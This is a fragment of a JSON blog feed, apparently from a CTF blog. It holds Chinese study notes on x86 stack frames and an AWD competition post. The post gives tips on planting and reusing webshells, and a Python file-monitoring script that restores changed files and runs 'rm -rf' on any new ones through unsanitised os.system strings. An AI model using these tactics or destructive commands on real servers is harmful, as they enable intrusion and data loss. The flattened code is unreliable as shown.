            "content_html": "<h1 id=\"pwn学习1\"><a class=\"anchor\" href=\"#pwn学习1\">#</a> pwn 学习 1</h1>\n<p>一张汇编图片<br />\n<img data-src=\"/img/PWN/huibian1.jpg\" alt=\"avatar\" /></p>\n<p>栈帧结构</p>\n<h1 id=\"fig-1函数调用发生和结束时调用栈的变化\"><a class=\"anchor\" href=\"#fig-1函数调用发生和结束时调用栈的变化\">#</a> Fig 1. 函数调用发生和结束时调用栈的变化</h1>\n<p>esp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。ebp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。eip 用来存储即将执行的程序指令的地址，cpu 依照 eip 的存储内容读取指令并执行，eip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。\u000b<br />\n下面让我们来看看发生函数调用时，栈顶函数状态以及上述寄存器的变化。变化的核心任务是将调用函数（caller）的状态保存起来，同时创建被调用函数（callee）的状态<br />\n<img data-src=\"/img/PWN/fig1.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-2将被调用函数的参数压入栈内\"><a class=\"anchor\" href=\"#fig-2将被调用函数的参数压入栈内\">#</a> Fig 2. 将被调用函数的参数压入栈内</h1>\n<p>将被调用函数的参数压入栈内<br />\n首先将被调用函数（callee）的参数按照逆序依次压入栈内。如果被调用函数（callee）不需要参数，则没有这一步骤。这些参数仍会保存在调用函数（caller）的函数状态内，之后压入栈内的数据都会作为被调用函数（callee）的函数状态来保存。<br />\n<img data-src=\"/img/PWN/fig2.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-3将被调用函数的返回地址压入栈内\"><a class=\"anchor\" href=\"#fig-3将被调用函数的返回地址压入栈内\">#</a> Fig 3. 将被调用函数的返回地址压入栈内</h1>\n<p>然后将调用函数（caller）进行调用之后的下一条指令地址作为返回地址压入栈内。这样调用函数（caller）的 eip（指令）信息得以保存。<br />\n<img data-src=\"/img/PWN/fig3.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\"><a class=\"anchor\" href=\"#fig-4将调用函数的基地址ebp压入栈内并将当前栈顶地址传到-ebp-寄存器内\">#</a> Fig 4. 将调用函数的基地址（ebp）压入栈内，并将当前栈顶地址传到 ebp 寄存器内</h1>\n<p>再将当前的 ebp 寄存器的值（也就是调用函数的基地址）压入栈内，并将 ebp 寄存器的值更新为当前栈顶的地址。这样调用函数（caller）的 ebp（基地址）信息得以保存。同时，ebp 被更新为被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig4.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-5将被调用函数的局部变量压入栈内\"><a class=\"anchor\" href=\"#fig-5将被调用函数的局部变量压入栈内\">#</a> Fig 5. 将被调用函数的局部变量压入栈内</h1>\n<p>再之后是将被调用函数（callee）的局部变量等数据压入栈内。。<br />\n<img data-src=\"/img/PWN/fig5.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-6将被调用函数的局部变量弹出栈外\"><a class=\"anchor\" href=\"#fig-6将被调用函数的局部变量弹出栈外\">#</a> Fig 6. 将被调用函数的局部变量弹出栈外</h1>\n<p>在压栈的过程中，esp 寄存器的值不断减小（对应于栈从内存高地址向低地址生长）。压入栈内的数据包括调用参数、返回地址、调用函数的基地址，以及局部变量，其中调用参数以外的数据共同构成了被调用函数（callee）的状态。在发生调用时，程序还会将被调用函数（callee）的指令地址存到 eip 寄存器内，这样程序就可以依次执行被调用函数的指令了。\u000b<br />\n看过了函数调用发生时的情况，就不难理解函数调用结束时的变化。变化的核心任务是丢弃被调用函数（callee）的状态，并将栈顶恢复为调用函数（caller）的状态。\u000b<br />\n首先被调用函数的局部变量会从栈内直接弹出，栈顶会指向被调用函数（callee）的基地址。<br />\n<img data-src=\"/img/PWN/fig6.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-7\"><a class=\"anchor\" href=\"#fig-7\">#</a> Fig 7.</h1>\n<p>将调用函数（caller）的基地址（ebp）弹出栈外，并存到 ebp 寄存器内<br />\n然后将基地址内存储的调用函数（caller）的基地址从栈内弹出，并存到 ebp 寄存器内。这样调用函数（caller）的 ebp（基地址）信息得以恢复。此时栈顶会指向返回地址。<br />\n<img data-src=\"/img/PWN/fig7.jpg\" alt=\"avatar\" /></p>\n<h1 id=\"fig-8\"><a class=\"anchor\" href=\"#fig-8\">#</a> Fig 8.</h1>\n<p>再将返回地址从栈内弹出，并存到 eip 寄存器内。这样调用函数（caller）的 eip（指令）信息得以恢复。<br />\n将被调用函数的返回地址弹出栈外，并存到 eip 寄存器内<br />\n至此调用函数（caller）的函数状态就全部恢复了，之后就是继续执行调用函数的指令了。<br />\n<img data-src=\"/img/PWN/fig8.jpg\" alt=\"avatar\" /></p>\n",
            "tags": []
        },
        {
            "id": "https://zephyr-cyber.github.io.git/AWD/",
            "url": "https://zephyr-cyber.github.io.git/AWD/",
            "title": "AWD脚本和加固命令",
            "date_published": "2021-12-20T02:44:24.484Z",
            "content_html": "<ol>\n<li>给的是 ctf 低权限账号，但是中间件运行的是 www-data 权限，通常比 ctf 权限高，有些马用 ssh 上去删不掉，可以先传个自己的 shell 然后去删，当然得做一个防止被偷家的措施，比如说加一个 if ('xxx'===md5 (key)) 的操作。也可以用 www-data 去对文件和目录做权限的修改等操作。</li>\n<li>黑吃黑，直接用别的队伍上传的 shell。</li>\n<li>不是特别大型的比赛没有那么多的时间去审漏洞，通常用 nday 直接打，或者内置的 shell 后门。</li>\n<li>批量拿 flag 并自动提交平台；自动备份与恢复自己的靶机文件。网上找的确实不会用</li>\n</ol>\n<h1 id=\"awd线下赛防守脚本\"><a class=\"anchor\" href=\"#awd线下赛防守脚本\">#</a> AWD 线下赛防守脚本：</h1>\n<p>1. 该脚本基于 python，可直接在 linux 靶机上运行。</p>\n<p>2. 开局直接运行起来，会自动对 web 目录进行备份，并建立 hash 索引。当 web 目录下有文件被删除或者被篡改的时候，会自动从备份中恢复文件。如果存在其他文件上传，会自动删除。</p>\n<p>3. 无法避免的缺点：由于条件竞争，如果对方在我们删除 shell 之前就已经在内存中开始生成不死马了，还是有一定几率沦陷。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">*</span><span class=\"token operator\">-</span> coding<span class=\"token punctuation\">:</span> utf<span class=\"token operator\">-</span><span class=\"token number\">8</span> <span class=\"token operator\">-</span><span class=\"token operator\">*</span><span class=\"token operator\">-</span><span class=\"token comment\">#</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>awd文件监控脚本</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">ListDir</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 获取网站所有文件</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>file_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">if</span> initialization<span class=\"token punctuation\">[</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'false'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>dir_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>dir_list_tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ListDir<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">if</span> initialization<span class=\"token punctuation\">[</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token string\">'false'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>file_list<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>file_list_tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">GetHash</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 获取 hash，建立索引</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">for</span> bak <span class=\"token keyword\">in</span> file_list<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>bak<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>md5obj <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>md5obj<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> md5obj<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>bak_dict<span class=\"token punctuation\">[</span>bak<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">hash</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_hash.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">False</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'mkdir /tmp/awd_web_bak/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\cp -a &#123;0&#125;* /tmp/awd_web_bak/'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_hash.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 记录 web 文件 hash</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>json<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>bak_dict<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> file_list<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 记录 web 文件列表</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_list.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>i <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> dir_list<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 记录 web 目录列表</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_dir.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>i <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">FileMonitor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 文件监控</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 提取当前 web 目录状态</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>initialization<span class=\"token punctuation\">[</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'true'</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>file_path <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token keyword\">if</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>isdir<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>dir_list_tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>ListDir<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>file_list_tmp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> file_list_tmp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>md5obj <span class=\"token operator\">=</span> hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>md5obj<span class=\"token punctuation\">.</span>update<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token builtin\">hash</span> <span class=\"token operator\">=</span> md5obj<span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>bak_dict_tmp<span class=\"token punctuation\">[</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">hash</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_hash.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 读取备份的文件 hash</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>real_bak_dict <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_list.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 读取备份的文件列表</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>real_file_list <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/tmp/awd_web_dir.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 读取备份的目录列表</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>real_dir_list <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token builtin\">dir</span> <span class=\"token keyword\">in</span> real_dir_list<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 恢复 web 目录</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>os<span class=\"token punctuation\">.</span>makedirs<span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[del-recover]dir:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">dir</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre><span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token builtin\">file</span> <span class=\"token keyword\">in</span> file_list_tmp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre><span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre><span class=\"token keyword\">if</span> real_bak_dict<span class=\"token punctuation\">[</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> bak_dict_tmp<span class=\"token punctuation\">[</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 检测被篡改的文件，自动恢复</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\cp &#123;0&#125; &#123;1&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">,</span> <span class=\"token string\">'/tmp/awd_web_bak/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[modify-recover]file:&#123;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre><span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span> <span class=\"token comment\"># 检测新增的文件，自动删除</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'rm -rf &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[delete]webshell:&#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre></pre></td></tr><tr><td data-num=\"90\"></td><td><pre><span class=\"token keyword\">for</span> real_file <span class=\"token keyword\">in</span> real_file_list<span class=\"token punctuation\">:</span> <span class=\"token comment\"># 检测被删除的文件，自动恢复</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre><span class=\"token keyword\">if</span> real_file <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> file_list_tmp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'\\\\cp &#123;0&#125; &#123;1&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>real_file<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span>web_dir<span class=\"token punctuation\">,</span> <span class=\"token string\">'/tmp/awd_web_bak/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> real_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[del-recover]file:&#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>real_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>file_list_tmp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>dir_list_tmp<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre></pre></td></tr><tr><td data-num=\"97\"></td><td><pre></pre></td></tr><tr><td data-num=\"98\"></td><td><pre>os<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'rm -rf /tmp/awd_web_hash.txt /tmp/awd_web_list.txt /tmp/awd_web_dir.txt /tmp/awd_web_bak/'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"99\"></td><td><pre>web_dir <span class=\"token operator\">=</span> <span class=\"token string\">'/var/www/'</span> <span class=\"token comment\"># web 目录，注意最后要加斜杠</span></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>file_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre>dir_list <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>bak_dict <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre>file_list_tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"104\"></td><td><pre>dir_list_tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>bak_dict_tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre>initialization <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'ok'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'false'</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>ListDir<span 